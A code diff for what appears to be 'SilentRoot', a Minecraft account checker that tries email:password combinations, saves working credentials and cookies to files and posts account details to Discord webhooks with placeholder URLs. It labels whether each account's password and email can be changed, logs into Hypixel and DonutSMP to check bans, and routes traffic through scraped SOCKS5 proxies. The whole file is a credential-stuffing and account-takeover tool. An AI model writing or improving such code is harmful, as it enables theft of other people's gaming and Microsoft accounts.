@@ -3,10 +3,14 @@ from datetime import datetime, timezone
 from colorama import Fore, Style, init
 from tkinter import filedialog
 
-# macOS-specific terminal setup
-if os.name != 'nt':
-    # Enable ANSI escape codes on macOS/Unix
-    init(autoreset=True)
+# Enable ANSI escape codes on Windows
+if os.name == 'nt':
+    try:
+        import ctypes
+        kernel32 = ctypes.windll.kernel32
+        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
+    except:
+        pass
 
 # Integrated console utils class
 class Utils:
@@ -14,10 +18,21 @@ class Utils:
     def set_title(title):
         """Set the console window title"""
         try:
-            if os.name != 'nt':  # macOS/Unix
-                # Use ANSI escape sequence for terminal title
-                sys.stdout.write(f"\033]0;{title}\007")
+            if os.name == 'nt':  # Windows
+                # Escape special characters and wrap in quotes
+                safe_title = title.replace('"', '""')  # Escape quotes
+                os.system(f'title "{safe_title}"')
+            else:
+                sys.stdout.write(f"\33]0;{title}\a")
                 sys.stdout.flush()
+        except:
+            pass
+
+    @staticmethod
+    def clear():
+        """Clear the console screen in a cross-platform way"""
+        try:
+            os.system('cls' if os.name == 'nt' else 'clear')
         except:
             pass
 
@@ -161,15 +176,15 @@ class Capture:
             
             if hypixel_banned or donut_banned:
                 # Banned webhook - Account is banned on at least one service
-                webhook_url = 'https://discord.com/api/webhooks/YOUR_BANNED_WEBHOOK_URL'
+                webhook_url = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL'
                 if screen == "'2'": print(Fore.RED + f"[WEBHOOK] Sending to BANNED webhook" + Style.RESET_ALL)
             elif hypixel_unbanned or donut_unbanned:
                 # Unbanned webhook - Account is explicitly clean/unbanned
-                webhook_url = 'https://discord.com/api/webhooks/YOUR_UNBANNED_WEBHOOK_URL'
+                webhook_url = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL'
                 if screen == "'2'": print(Fore.GREEN + f"[WEBHOOK] Sending to UNBANNED webhook" + Style.RESET_ALL)
             else:
                 # Normal webhook - Optional: Set to None or empty string to disable
-                webhook_url = 'None'
+                webhook_url = None
                 # To disable normal webhook, set: webhook_url = None
                 
                 if webhook_url:  # Only log if webhook is configured
@@ -207,40 +222,27 @@ class Capture:
                 if self.bwstars: fields.append({"name": "<:hypixel:1430291770012340246> Bᴇᴅᴡᴀʀѕ Sᴛᴀʀѕ", "value": self.bwstars, "inline": True})
                 if self.sbcoins: fields.append({"name": "<:hypixel:1430291770012340246> Sᴋʏʙʟᴏᴄᴋ Cᴏɪɴѕ", "value": self.sbcoins, "inline": True})
                 
-                # Always show Hypixel Status if ban checking is enabled
+                # Hypixel Status (only when ban check enabled)
                 if config.get('hypixelban') is True:
-                    if self.banned:
-                        ban_emoji = "<a:banned:1430293755155448014>" if str(self.banned).lower() != "false" else "<a:unbanned:1430296212015419484>"
-                        ban_text = str(self.banned)
-                        # Clean up version error messages and suggest specific version
-                        if "Your version" in ban_text and ("cannot be used" in ban_text or "is disabled" in ban_text or "compatibility issues" in ban_text):
-                            # Try to extract current version and suggest compatible version
-                            import re
-                            version_match = re.search(r'version \(([^)]+)\)', ban_text)
-                            current_version = version_match.group(1) if version_match else "unknown"
-                            
-                            # Suggest appropriate version based on current version
-                            if current_version in ["1.13", "1.14", "1.15", "1.16", "1.16.1", "1.16.2", "1.16.3", "1.64.1", "1.20.1", "1.22.1"]:
-                                ban_text = f"Version {current_version} incompatible - Use Minecraft 1.16.4+ or 1.20.1+"
-                            elif current_version in ["1.17", "1.18"]:
-                                ban_text = f"Version {current_version} incompatible - Use Minecraft 1.19+ or 1.20.1+"
-                            elif "1.8" in current_version or "1.9" in current_version or "1.10" in current_version or "1.11" in current_version or "1.12" in current_version:
-                                ban_text = f"Version {current_version} too old - Use Minecraft 1.16.4+ or 1.20.1+"
-                            else:
-                                ban_text = f"Version {current_version} incompatible - Use Minecraft 1.20.1+ (recommended)"
-                        elif "due to compatibility issues" in ban_text:
-                            ban_text = "Version incompatible - Use Minecraft 1.20.1+ (recommended)"
-                        elif len(ban_text) > 100:
-                            ban_text = ban_text[:97] + "..."
-                        fields.append({"name": f"{ban_emoji} Hʏᴘɪxᴇʟ Sᴛᴀᴛᴜѕ", "value": ban_text, "inline": True})
+                    raw = self.banned
+                    unknown = (raw is None) or (isinstance(raw, str) and raw.strip().lower() in ("none", "", "null"))
+                    if unknown:
+                        ban_emoji = "<a:banned:1430293755155448014>"
+                        display_text = "Banned"
                     else:
-                        # Show "Not Checked" if ban status is None/empty
-                        fields.append({"name": "<a:idkk:1434492987391475712> Hʏᴘɪxᴇʟ Sᴛᴀᴛᴜѕ", "value": "Not Checked", "inline": True})
-                
+                        status_raw = str(raw)
+                        sr_low = status_raw.lower()
+                        is_unbanned = (sr_low == "false" or "closed" in sr_low or "cloning" in sr_low)
+                        ban_emoji = "<a:unbanned:1430296212015419484>" if is_unbanned else "<a:banned:1430293755155448014>"
+                        display_text = "Unbanned" if is_unbanned else status_raw
+                    if len(display_text) > 250:
+                        display_text = display_text[:247] + "..."
+                    fields.append({"name": "<a:status:1434520216028577885> Hʏᴘɪxᴇʟ Sᴛᴀᴛᴜѕ", "value": f"{ban_emoji} {display_text}", "inline": True})
+
                 if self.capes and self.capes != "N/A": fields.append({"name": "<:cape:1430291744934592612> Cᴀᴘᴇѕ", "value": self.capes, "inline": True})
                 if self.cape: fields.append({"name": "<:cape:1430291744934592612> Oᴘᴛɪꜰɪɴᴇ Cᴀᴘᴇ", "value": self.cape, "inline": True})
                 
-                # Password & Email & Name Change Detection - Always show if detected
+                # Password & Email & Name Change Detection
                 if hasattr(self, 'password_changeable') and self.password_changeable is not None and self.password_changeable != "None":
                     emoji = "<a:rght:1434491384370434168>" if self.password_changeable == "True" else "<a:wrng:1434491325910220951>" if self.password_changeable == "False" else "<a:idkk:1434492987391475712>"
                     fields.append({"name": "<:keiy:1430291766590050304> Pᴀѕѕᴡᴏʀᴅ Cʜᴀɴɢᴇᴀʙʟᴇ", "value": f"{emoji} {self.password_changeable}", "inline": True})
@@ -265,9 +267,9 @@ class Capture:
                                (hasattr(self, 'donut_shards') and self.donut_shards)
                     
                     if self.donut_status == "unbanned" and not has_stats:
-                        fields.append({"name": f"<a:donut:1430291763641188372> DᴏɴᴜᴛSᴍᴘ Sᴛᴀᴛᴜѕ", "value": f"{donut_emoji} Unbanned (Stats not available)", "inline": True})
+                        fields.append({"name": f"<a:donut:1430291763641188372> Dᴏɴᴜᴛ Sᴛᴀᴛᴜѕ", "value": f"{donut_emoji} Unbanned", "inline": True})
                     else:
-                        fields.append({"name": f"<a:donut:1430291763641188372> DᴏɴᴜᴛSᴍᴘ Sᴛᴀᴛᴜѕ", "value": f"{donut_emoji} {self.donut_status.title()}", "inline": True})
+                        fields.append({"name": f"<a:donut:1430291763641188372> Dᴏɴᴜᴛ Sᴛᴀᴛᴜѕ", "value": f"{donut_emoji} {self.donut_status.title()}", "inline": True})
                     
                     # Ban-specific info
                     if self.donut_reason: fields.append({"name": "<a:donut:1430291763641188372> Bᴀɴ Rᴇᴀѕᴏɴ", "value": self.donut_reason, "inline": True})
@@ -390,84 +392,24 @@ class Capture:
                 self.access = "Unknown"
     
     def check_changeability(self):
-        """Check if email, password, and name are changeable using actual API verification"""
-        if not self.token or not self.session:
-            return
-        
-        tries = 0
-        while tries < maxretries:
-            try:
-                # PASSWORD CHANGEABILITY CHECK - Try to access password change endpoint
-                if self.password_changeable is None:
-                    try:
-                        # Try to access Microsoft password change page
-                        pwd_check = self.session.get(
-                            'https://account.live.com/password/change',
-                            headers={'Authorization': f'Bearer {self.token}'},
-                            proxies=getproxy(),
-                            verify=False,
-                            timeout=10,
-                            allow_redirects=True
-                        )
-                        
-                        # If we can access the page without being redirected to verification, password is changeable
-                        if pwd_check.status_code == 200:
-                            # Check if page requires additional verification
-                            if 'verify' in pwd_check.url.lower() or 'proofs' in pwd_check.url.lower() or 'challenge' in pwd_check.url.lower():
-                                self.password_changeable = "False"  # Requires verification (SFA)
-                            else:
-                                self.password_changeable = "True"  # Can access directly (MFA)
-                        else:
-                            self.password_changeable = "False"
-                    except:
-                        # If check fails, use MFA/SFA status as fallback
-                        if self.access == "True":
-                            self.password_changeable = "True"
-                        elif self.access == "False":
-                            self.password_changeable = "False"
-                        else:
-                            self.password_changeable = "Unknown"
-                
-                # EMAIL CHANGEABILITY CHECK - Try to access email change endpoint
-                if self.email_changeable is None:
-                    try:
-                        # Try to access Microsoft email management page
-                        email_check = self.session.get(
-                            'https://account.live.com/names/Manage',
-                            headers={'Authorization': f'Bearer {self.token}'},
-                            proxies=getproxy(),
-                            verify=False,
-                            timeout=10,
-                            allow_redirects=True
-                        )
-                        
-                        # If we can access the page without being redirected to verification, email is changeable
-                        if email_check.status_code == 200:
-                            # Check if page requires additional verification
-                            if 'verify' in email_check.url.lower() or 'proofs' in email_check.url.lower() or 'challenge' in email_check.url.lower():
-                                self.email_changeable = "False"  # Requires verification (SFA)
-                            else:
-                                self.email_changeable = "True"  # Can access directly (MFA)
-                        else:
-                            self.email_changeable = "False"
-                    except:
-                        # If check fails, use MFA/SFA status as fallback
-                        if self.access == "True":
-                            self.email_changeable = "True"
-                        elif self.access == "False":
-                            self.email_changeable = "False"
-                        else:
-                            self.email_changeable = "Unknown"
-                
-                break
-            except:
-                tries += 1
-                if tries >= maxretries:
-                    # Final fallback - use MFA/SFA status
-                    if self.password_changeable is None:
-                        self.password_changeable = "True" if self.access == "True" else "False" if self.access == "False" else "Unknown"
-                    if self.email_changeable is None:
-                        self.email_changeable = "True" if self.access == "True" else "False" if self.access == "False" else "Unknown"
+        """
+        Simplified and reliable email/password changeability detection
+        Logic: MFA (Full Access) = Can change email & password
+               SFA (No Access) = Cannot change email & password
+        """
+        # Simple and reliable: Use MFA/SFA status directly
+        if self.access == "True":
+            # MFA = Full email access = Can change email and password
+            self.password_changeable = "True"
+            self.email_changeable = "True"
+        elif self.access == "False":
+            # SFA = No email access = Cannot change email and password
+            self.password_changeable = "False"
+            self.email_changeable = "False"
+        else:
+            # Unknown access status
+            self.password_changeable = "Unknown"
+            self.email_changeable = "Unknown"
     
     def save_changeability(self):
         """Save accounts with changeable fields to separate file"""
@@ -603,70 +545,52 @@ class Capture:
             if self.namechanged is None:
                 self.namechanged = "Unknown"
     
-    def ban(self):
+    def ban(self, session):
         global errors
-        if config.get('hypixelban') is True:
+        if config.get('hypixelban'):
             auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
             auth_token.profile = Profile(id_=self.uuid, name=self.name)
             tries = 0
-            
-            # OPTION 3: Prioritize stable versions that work best
-            # These versions have the highest success rate on Hypixel
-            stable_versions = [763, 765, 767]  # 1.20.1, 1.20.4, 1.21 - Most stable and reliable
-            backup_versions = [760, 761, 762, 764, 766]  # Backup versions if stable fails
-            
-            # OPTION 2: Better server rotation for improved reliability
-            servers = ["mc.hypixel.net", "hypixel.net"]  # mc.hypixel.net is more reliable
-            
             while tries < maxretries:
-                # OPTION 3: Smart version selection prioritizing working versions
-                if tries == 0:
-                    # First attempt: Use most stable version (1.20.1)
-                    version = 763
-                    server = servers[0]
-                elif tries == 1:
-                    # Second attempt: Try another stable version (1.20.4)
-                    version = 765
-                    server = servers[0]
-                elif tries == 2:
-                    # Third attempt: Try latest stable (1.21)
-                    version = 767
-                    server = servers[1] if len(servers) > 1 else servers[0]
-                else:
-                    # Additional attempts: Use backup versions
-                    version = random.choice(backup_versions)
-                    server = random.choice(servers)
-                
-                connection = Connection(server, 25565, auth_token=auth_token, initial_version=version, allowed_versions={version})
+                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
                 @connection.listener(clientbound.login.DisconnectPacket, early=True)
                 def login_disconnect(packet):
                     data = json.loads(str(packet.json_data))
                     if "Suspicious activity" in str(data):
                         self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                         with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                        self.save_cookies('Banned')
                     elif "temporarily banned" in str(data):
                         self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                         with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                        self.save_cookies('Banned')
                     elif "You are permanently banned from this server!" in str(data):
                         self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                         with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                        self.save_cookies('Banned')
                     elif "The Hypixel Alpha server is currently closed!" in str(data):
                         self.banned = "False"
                         with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                        self.save_cookies('Unbanned')
                     elif "Failed cloning your SkyBlock data" in str(data):
                         self.banned = "False"
                         with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                        self.save_cookies('Unbanned')
                     else:
                         self.banned = ''.join(item["text"] for item in data["extra"])
                         with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                        self.save_cookies('Banned')
                 @connection.listener(clientbound.play.JoinGamePacket, early=True)
                 def joined_server(packet):
                     if self.banned == None:
                         self.banned = "False"
                         with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                        self.save_cookies('Unbanned', session)
                 try:
-                    # Only use proxies for ban checking if proxyless ban check is disabled
-                    if not config.get('proxylessban') and len(banproxies) > 0:
+                    # Set a short default socket timeout to avoid hanging on bad proxies
+                    original_timeout = socket.getdefaulttimeout()
+                    socket.setdefaulttimeout(8)
+                    if len(banproxies) > 0:
                         proxy = random.choice(banproxies)
                         if '@' in proxy:
                             atsplit = proxy.split('@')
@@ -675,55 +599,28 @@ class Capture:
                             ip_port = proxy.split(':')
                             socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                         socket.socket = socks.socksocket
-                    
                     original_stderr = sys.stderr
                     sys.stderr = StringIO()
-                    
                     try:
-                        # Add random delay before connection to avoid pattern detection
-                        time.sleep(random.uniform(0.5, 2.0))
                         connection.connect()
+                        # Wait briefly for a disconnect or join packet to set banned status
                         c = 0
-                        while self.banned == None and c < 500:  # Wait up to 10 seconds
-                            time.sleep(.02)
-                            c+=1
-                        connection.disconnect()
-                        
-                        # If still None after connection, set to False (unbanned)
-                        if self.banned == None:
-                            self.banned = "False"
-                            with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
-                            
-                    except Exception as e:
-                        error_str = str(e).lower()
-                        # Handle specific connection errors
-                        if "hacked" in error_str or "rejected" in error_str:
-                            self.banned = "Unable to check - Server protection"
-                        elif "timeout" in error_str or "timed out" in error_str:
-                            self.banned = "Unable to check - Connection timeout"
-                        elif "refused" in error_str or "connection" in error_str:
-                            self.banned = "Unable to check - Connection failed"
-                        else:
-                            # Generic error
-                            if self.banned == None:
-                                self.banned = f"Unable to check - {str(e)[:50]}"
-                        
-                        if screen == "'2'": 
-                            print(Fore.YELLOW + f"⚠️  Hypixel ban check error: {str(e)[:50]}" + Style.RESET_ALL)
-                    
+                        while self.banned == None and c < 600:  # ~6s
+                            time.sleep(0.01)
+                            c += 1
+                        try:
+                            connection.disconnect()
+                        except:
+                            pass
+                    except Exception:
+                        # Rotate proxy on failures
+                        pass
                     sys.stderr = original_stderr
-                    
-                except Exception as e:
-                    if screen == "'2'": 
-                        print(Fore.RED + f"❌ Hypixel ban check failed: {str(e)[:50]}" + Style.RESET_ALL)
-                    if self.banned == None:
-                        self.banned = "Unable to check - Setup failed"
-                
-                # If we got a result, break the retry loop
-                if self.banned != None: 
-                    break
-                    
-                tries += 1
+                    # Restore default timeout
+                    socket.setdefaulttimeout(original_timeout)
+                except: pass
+                if self.banned != None: break
+                tries+=1
             
             # Final fallback - if all retries failed and still None
             if self.banned == None:
@@ -947,6 +844,34 @@ class Capture:
                     else:
                         self.donut_reason = "Banned (no details provided)"
                     with open(f"results/{fname}/DonutBanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+
+                    # Attempt to fetch public stats even when banned
+                    try:
+                        stat_urls = [
+                            f"https://stats.donutsmp.net/player/{self.name}",
+                            f"https://donutsmp.net/stats/{self.name}",
+                            f"https://api.donutsmp.net/stats/{self.name}",
+                            f"https://www.donutsmp.net/player/{self.name}"
+                        ]
+                        for url in stat_urls:
+                            try:
+                                stat_response = requests.get(url, timeout=3, verify=False)
+                                if stat_response.status_code == 200 and len(stat_response.text) > 100:
+                                    if screen == "'2'": print(Fore.GREEN + f"[DEBUG] (Banned) Found stats website: {url}" + Style.RESET_ALL)
+                                    stat_text = stat_response.text
+                                    money_match = re.search(r'(?:money|balance|coins?)\D*([\d,]+)', stat_text, re.IGNORECASE)
+                                    if money_match: self.donut_money = f"${money_match.group(1)}"
+                                    playtime_match = re.search(r'(?:playtime|time played)\D*([\d]+\s*(?:hours?|days?|minutes?)(?:\s*[\d]+\s*(?:hours?|minutes?))?)', stat_text, re.IGNORECASE)
+                                    if playtime_match: self.donut_playtime = playtime_match.group(1)
+                                    kills_match = re.search(r'kills?\D*([\d,]+)', stat_text, re.IGNORECASE)
+                                    if kills_match: self.donut_kills = kills_match.group(1)
+                                    deaths_match = re.search(r'deaths?\D*([\d,]+)', stat_text, re.IGNORECASE)
+                                    if deaths_match: self.donut_deaths = deaths_match.group(1)
+                                    break
+                            except:
+                                continue
+                    except Exception:
+                        pass
                 connection.disconnect()
             except Exception as e:
                 pass
@@ -2219,7 +2144,7 @@ def logscreen():
     bar = '█' * filled_length + '░' * (bar_length - filled_length)
     
     # Clear screen and display modern UI
-    os.system('cls' if os.name == 'nt' else 'clear')
+    utils.clear()
     
     # Header
     print(f"{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗")
@@ -2279,7 +2204,7 @@ def logscreen():
 def finishedscreen():
     """End Screen from backup version"""
     global hits, bad, sfa, mfa, twofa, xgp, xgpu, other, vm, retries, errors, fname, donut_banned, donut_unbanned, checked
-    os.system('cls')
+    utils.clear()
     print(logo)
     print()
     print(f"{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗")
@@ -2323,7 +2248,7 @@ def Main():
     """Main Configuration Screen from backup version"""
     global proxytype, screen, thread, banproxies
     utils.set_title("SilentRoot - Advanced MC Checker")
-    os.system('cls')
+    utils.clear()
     
     try:
         loadconfig()
@@ -2400,12 +2325,39 @@ def Main():
                 print(Fore.RED + Style.BRIGHT + "Invalid choice, auto-scraping SOCKS proxies..." + Style.RESET_ALL)
                 get_ban_proxies()
         else:
-            banproxies.extend(proxylist)
+            # When sharing proxies, avoid scraping here in proxyless mode; let proxyless handler manage it
+            if proxytype == "'4'":
+                pass
+            else:
+                try:
+                    shared_socks5 = []
+                    # proxylist may contain dicts (auto-scraper) or raw strings (manual file)
+                    for p in proxylist:
+                        if isinstance(p, dict):
+                            val = p.get('http') or p.get('https')
+                            if isinstance(val, str) and val.startswith('socks5://'):
+                                host_port = val.replace('socks5://', '')
+                                shared_socks5.append(host_port)
+                        elif isinstance(p, str):
+                            # Accept plain ip:port only for SOCKS5 by best-effort validation
+                            if ':' in p:
+                                shared_socks5.append(p)
+                    if len(shared_socks5) == 0:
+                        # Fallback to auto-scrape dedicated SOCKS if none available, but only if not already loaded
+                        if len(banproxies) == 0:
+                            get_ban_proxies()
+                    else:
+                        banproxies.extend(shared_socks5)
+                except Exception:
+                    # Defensive fallback, avoid duplicate scrape
+                    if len(banproxies) == 0:
+                        get_ban_proxies()
     
     # Auto-scrape SOCKS5 proxies for ban checking when using proxyless mode
     if proxytype == "'4'" and config.get('hypixelban') is True and config.get('proxylessban') is False:
         print(Fore.CYAN + Style.BRIGHT + "\n🔍 Proxyless mode detected" + Style.RESET_ALL)
-        get_ban_proxies()
+        if len(banproxies) == 0:
+            get_ban_proxies()
         if len(banproxies) > 0:
             print(Fore.GREEN + Style.BRIGHT + f"✅ Loaded {len(banproxies)} SOCKS5 proxies for ban checking!" + Style.RESET_ALL)
         else:
